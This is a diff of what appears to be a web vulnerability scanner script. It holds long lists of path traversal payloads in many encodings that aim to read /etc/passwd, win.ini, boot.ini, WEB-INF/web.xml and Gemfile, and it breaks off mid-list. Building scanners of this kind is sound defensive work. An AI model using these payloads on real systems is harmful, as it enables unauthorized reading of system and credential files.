@@ -1,0 +1,379 @@
+#include helpers.inc;
+#include constants.inc;
+#noretest;
+var lastJob  = null;
+var lastJob2 = null;
+var static_names = ["static", "js", "css", "img", "images", "files", "uploadfile", "uploads", "upload"]
+var variants_full = [
+				"${dirName}/../../../../../../../../etc/passwd",
+				"${dirName}/../../../../../../../../windows/win.ini",
+				"${dirName}/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd",
+				"${dirName}/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows/win.ini",
+				"${dirName}//....//....//....//....//....//....//....//....//etc//passwd",
+				"${dirName}/../../../../../../../../boot.ini",
+				"${dirName}/../../../../../../../../etc/passwd%00",
+				"${dirName}/../../../../../../../../windows/win.ini%00",
+				"${dirName}/../../../../../../../../etc/passwd%00en",
+				"${dirName}/../../../../../../../../windows/win.ini%00en",
+				"${dirName}/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd",
+				"${dirName}/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows/win.ini",
+				"${dirName}/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fboot.ini",
+				"${dirName}/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/boot.ini",
+				"${dirName}/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/etc/passwd",
+				"${dirName}/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
+				"${dirName}/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/windows/win.ini",
+				"${dirName}/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
+				"${dirName}/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot.ini",
+				"${dirName}/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fwindows/win.ini",
+				"${dirName}/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd",
+				"${dirName}/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fwindows/win.ini",
+				"${dirName}/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fboot.ini",
+				"${dirName}/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd",
+				"${dirName}/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/windows/win.ini",
+				"${dirName}/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd",
+				"${dirName}/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fwindows/win.ini",
+				"${dirName}/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f/etc/passwd",
+				"${dirName}/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd",
+				"${dirName}/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd",
+				"${dirName}/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd",
+				"${dirName}/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f/etc/passwd",
+				"${dirName}/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e//etc/passwd",
+				"${dirName}/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f/etc/passwd",
+				"${dirName}/..%255c..%255c..%255c..%255c..%255c..%255c..%255c..%255c..%255c..%255c..%255c..%255c..%255c..%255c..%255c..%255c/etc/passwd",
+				"${dirName}/%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c/etc/passwd",
+				"${dirName}/%252e%252e\\%252e%252e\\%252e%252e\\%252e%252e\\%252e%252e\\%252e%252e\\%252e%252e\\%252e%252e\\%252e%252e\\%252e%252e\\%252e%252e\\%252e%252e\\%252e%252e\\%252e%252e\\%252e%252e\\%252e%252e\\/etc/passwd",
+				"${dirName}/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af/etc/passwd",
+				"${dirName}/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae//etc/passwd",
+				"${dirName}/%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af/etc/passwd",
+				"${dirName}/%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af/etc/passwd",
+				"${dirName}/..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c/etc/passwd",
+				"${dirName}/%c0%ae%c0%ae\\%c0%ae%c0%ae\\%c0%ae%c0%ae\\%c0%ae%c0%ae\\%c0%ae%c0%ae\\%c0%ae%c0%ae\\%c0%ae%c0%ae\\%c0%ae%c0%ae\\%c0%ae%c0%ae\\%c0%ae%c0%ae\\%c0%ae%c0%ae\\%c0%ae%c0%ae\\%c0%ae%c0%ae\\%c0%ae%c0%ae\\%c0%ae%c0%ae\\%c0%ae%c0%ae\\/etc/passwd",
+				"${dirName}/%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c/etc/passwd",
+				"${dirName}/%25c0%25ae%25c0%25ae\\%25c0%25ae%25c0%25ae\\%25c0%25ae%25c0%25ae\\%25c0%25ae%25c0%25ae\\%25c0%25ae%25c0%25ae\\%25c0%25ae%25c0%25ae\\%25c0%25ae%25c0%25ae\\%25c0%25ae%25c0%25ae\\%25c0%25ae%25c0%25ae\\%25c0%25ae%25c0%25ae\\%25c0%25ae%25c0%25ae\\%25c0%25ae%25c0%25ae\\%25c0%25ae%25c0%25ae\\%25c0%25ae%25c0%25ae\\%25c0%25ae%25c0%25ae\\%25c0%25ae%25c0%25ae\\/etc/passwd",
+				"${dirName}/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f/etc/passwd",
+				"${dirName}/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f/etc/passwd",
+				"${dirName}/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f/etc/passwd",
+				"${dirName}/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e//etc/passwd",
+				"${dirName}/..\\\\\\..\\\\\\..\\\\\\..\\\\\\..\\\\\\..\\\\\\..\\\\\\..\\\\\\..\\\\\\..\\\\\\..\\\\\\..\\\\\\..\\\\\\..\\\\\\..\\\\\\..\\\\\\/etc/passwd",
+				"${dirName}/..../..../..../..../..../..../..../..../..../..../..../..../..../..../..../..../..../....//etc/passwd",
+				"${dirName}%c2.%c2./%c2.%c2./%c2.%c2./%c2.%c2./%c2.%c2./%c2.%c2/%c2.%c2./%c2.%c2./%c2.%c2./%c2.%c2./%c2.%c2./%c2.%c2/etc/passwd",
+				"${dirName}/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd",
+				"${dirName}/..\..\..\..\..\..\..\..\etc/passwd",
+				"${dirName}/..\..\..\..\..\..\..\..\windows/win.ini",
+				"${dirName}/..%255c..%255c..%255c..%255c..%255c..%255c..%255c..%255cetc/passwd",
+				"${dirName}/..%255c..%255c..%255c..%255c..%255c..%255c..%255c..%255cwindows/win.ini",
+				"${dirName}/..%255c..%255c..%255c..%255c..%255c..%255c..%255c..%255cboot.ini",
+				"${dirName}/%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\etc/passwd",
+				"${dirName}/%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\windows/win.ini",
+				"${dirName}/%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cetc/passwd",
+				"${dirName}/%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows/win.ini",
+				"${dirName}/%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\etc/passwd",
+				"${dirName}/%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\windows/win.ini",
+				"${dirName}/%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255cetc/passwd",
+				"${dirName}/%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255cwindows/win.ini",
+				"${dirName}/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afwindows/win.ini",
+				"${dirName}/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
+				"${dirName}/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/windows/win.ini",
+				"${dirName}/%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af/windows/win.ini",
+				"${dirName}/%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc%c0%afpasswd",
+				"${dirName}/..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af/etc/passwd",
+				"${dirName}/..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af/windows/win.ini",
+				"${dirName}/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%2/%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c5c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/etc/passwd",
+				"${dirName}/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/windows/win.ini",
+				"${dirName}/%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25afetc/passwd",
+				"${dirName}/%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25afwindows/win.ini",
+				"${dirName}/..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c/etc/passwd",
+				"${dirName}/..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c/windows/win.ini",
+				"${dirName}/%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\etc/passwd",
+				"${dirName}/%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\windows/win.ini",
+				"${dirName}/%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c/etc/passwd",
+				"${dirName}/%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c/windows/win.ini",
+				"${dirName}/%c0%af..%c0%af%c0%af%c0%af%c0%af..%c0%af%c0%af%c0%af%c0%af..%c0%af%c0%af%c0%af%c0%af..%c0%af%c0%af%c0%af%c0%af..%c0%af%c0%af%c0%af%c0%af..%c0%af%c0%af%c0%af%c0%af..%c0%af%c0%af%c0%af%c0%af..%c0%af%c0%af%c0%af%c0%af..%c0%af%c0%af%c0%af%c0%af..%c0%af%c0%af%c0%af%c0%af..%c0%af%c0%af%c0%af%c0%af..%c0%af%c0%af%c0%af%c0%af..%c0%af%c0%af%c0%af%c0%afetc%c0%af%c0%af%c0%afpasswd",
+				"${dirName}/..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c/etc/passwd",
+				"${dirName}/..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c/windows/win.ini",
+				"${dirName}/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../../../../../../../etc/passwd",
+				"${dirName}/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../../../../../../../windows/win.ini",
+				"${dirName}/\../\../\../\../\../\../\../\../etc/passwd",
+				"${dirName}/\../\../\../\../\../\../\../\../windows/win.ini",
+				"${dirName}/\../\../\../\../\../\../\../\../boot.ini",
+				"${dirName}//..\/..\/..\/..\/..\/..\/..\/..\etc/passwd",
+				"${dirName}//..\/..\/..\/..\/..\/..\/..\/..\windows/win.ini",
+				"${dirName}//..\/..\/..\/..\/..\/..\/..\/..\boot.ini",
+				"${dirName}/.../.../.../.../.../.../.../.../etc/passwd",
+				"${dirName}/.../.../.../.../.../.../.../.../windows/win.ini",
+				"${dirName}/........................................................................../../../../../../../../etc/passwd",
+				"${dirName}/........................................................................../../../../../../../../windows/win.ini",
+				"${dirName}/..%u2215..%u2215..%u2215..%u2215..%u2215..%u2215..%u2215..%u2215etc/passwd",
+				"${dirName}/..%u2215..%u2215..%u2215..%u2215..%u2215..%u2215..%u2215..%u2215windows/win.ini",
+				"${dirName}/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/etc/passwd",
+				"${dirName}/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/windows/win.ini",
+				"${dirName}/..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c..0x5cetc/passwd",
+				"${dirName}/..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c..0x5cwindows/win.ini",
+				"${dirName}/\\\%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cetc/passwd",
+				"${dirName}/\\\%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows/win.ini",
+				"${dirName}/.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\etc/passwd",
+				"${dirName}/.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\windows/win.ini",
+				"${dirName}/.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\etc/passwd",
+				"${dirName}/.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\windows/win.ini",
+				"${dirName}/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../../../../../../etc/passwd",
+				"${dirName}/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../../../../../../windows/win.ini"
+			   ];
+			   
+var variants_static = [
+				"${dirName}/../../../../../../../../etc/passwd",
+				"${dirName}/../../../../../../../../windows/win.ini",
+				"${dirName}//%5c../%5c../%5c../%5c../%5c../%5c../%5c../etc/passwd",					
+				"${dirName}/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd",
+				"${dirName}/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows/win.ini",
+				"${dirName}//....//....//....//....//....//....//....//....//etc//passwd",
+				"${dirName}/../../../../../../../../boot.ini",
+				"${dirName}/../../../../../../../../etc/passwd%00.jpg",
+				"${dirName}/../../../../../../../../etc/passwd%00.jsp",
+				"${dirName}/../../../../../../../../etc/passwd%C0%80.jsp",
+				"${dirName}/../../../../../../../../windows/win.ini%00.jpg",
+				"${dirName}/../../../../../../../../windows/win.ini%C0%80.jsp",
+				"${dirName}/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd",
+				"${dirName}/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows/win.ini",
+				"${dirName}/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fboot.ini",
+				"${dirName}/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/boot.ini",
+				"${dirName}/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/etc/passwd",
+				"${dirName}/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",					
+				"${dirName}/..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af/etc/passwd",
+				"${dirName}/..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af/windows/win.ini",
+				"${dirName}/./WEB-INF/web.xml?",
+				"${dirName}/./WEB-INF/web.xml%C0%80.jsp",
+				"${dirName}/./WEB-INF/web.xml%00.jsp",
+				"${dirName}/./WEB-INF/web.xml?",
+				"${dirName}/../WEB-INF/web.xml?",
+				"${dirName}/%C0%AE%C0%AE/WEB-INF/web.xml?",
+				"${dirName}/../WEB-INF/web.xml%C0%80.jsp",
+				"${dirName}/../WEB-INF/web.xml%00.jsp",
+				"${dirName}/../../WEB-INF/web.xml?",
+				"${dirName}/%C0%AE%C0%AE/%C0%AE%C0%AE/WEB-INF/web.xml?",
+				"${dirName}/../../WEB-INF/web.xml%C0%80.jsp",
+				"${dirName}/../../WEB-INF/web.xml%00.jsp",
+				"${dirName}/../../../WEB-INF/web.xml?",
+				"${dirName}/%C0%AE%C0%AE/%C0%AE%C0%AE/%C0%AE%C0%AE/WEB-INF/web.xml?",
+				"${dirName}/../../../WEB-INF/web.xml%C0%80.jsp",
+				"${dirName}/../../../WEB-INF/web.xml%00.jsp",
+				"${dirName}/../Gemfile",
+				"${dirName}/%5C../Gemfile",
+				"${dirName}/%5C..%2fGemfile",
+				"${dirName}/../../Gemfile",
+				"${dirName}/%5C../%5C../Gemfile",
+				"${dirName}/%5C..%2f%5C..%2fGemfile",
+				"${dirName}/../../../Gemfile",
+				"${dirName}/%5C../%5C../%5C../Gemfile",
+				"${dirName}/%5C..%2f%5C..%2f%5C..%2fGemfile",
+				"${dirName}/../../../../Gemfile",
+				"${dirName}/%5C../%5C../%5C../%5C../Gemfile",
+				"${dirName}/%5C..%2f%5C..%2f%5C..%2f%5C..%2fGemfile",
+				"${dirName}/../../../../../Gemfile",
